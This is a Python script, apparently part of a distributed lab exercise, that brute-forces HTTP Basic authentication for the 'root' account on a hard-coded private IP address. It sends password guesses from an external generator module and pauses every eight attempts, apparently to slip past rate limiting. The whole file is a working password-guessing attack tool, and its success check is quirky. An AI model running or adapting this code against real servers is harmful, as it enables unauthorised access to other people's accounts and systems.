import time
import socket
import base64
import string
import selectors
import argparse
import algorithm

class Slave:
    __host = '192.168.53.116'
    __port = 8000
    __username = 'root'
    __path = '/'
    done = False
    count = 0
    
    def __init__(self):
        self.ID = 0
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.__host, self.__port))
        self.socket.setblocking(False)
        self.passwords = []
        self.selector = selectors.DefaultSelector()
        self.selector.register(self.socket, selectors.EVENT_READ, self.recv)
        self.chars = string.ascii_letters + string.digits                     # Chars used to make the password
        self.offset = 1                                                       # Number of Slaves            
        
    
    def guess(self, pswd):
        self.count += 1
        token = '{}:{}'.format(self.__username, pswd)
        token = token.encode('ascii')
        token = base64.b64encode(token)
        token = token.decode('ascii')
        
        lines = [
            'GET / HTTP/1.1',
            'Host: {}'.format(self.__host),
            'Authorization: Basic {}'.format(token),
            'Connection: keep-alive'
        ]
        request = '\r\n'.join(lines)+'\r\n\r\n'
        self.socket.send(request.encode('utf-8'))
        
        if self.count == 8:
            time.sleep(1.5)
            self.count = 0
        

    def run(self, _timeout = 0):
        pswd = "AAA"
        while not self.done:
            pswd = algorithm.getNext(self.chars, self.offset, self.ID, pswd)
            self.guess(pswd)
            event = self.selector.select(timeout=_timeout)
            for key,mask in event:
                socket = key.fileobj
                callback = key.data
                callback(socket)


    def recv(self, socket):
        result = socket.recv(1024)
        try:
            result = result.decode('utf-8')
            result.split("\n")[-3]
        except:
            print("its good")
            self.done = True

def main(secret):
    s = Slave()
    s.run()   


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Authentication Server')
    parser.add_argument('-s', dest='secret', type=str, help='Http Pass', default="a")
    args = parser.parse_args()
    main(args.secret)
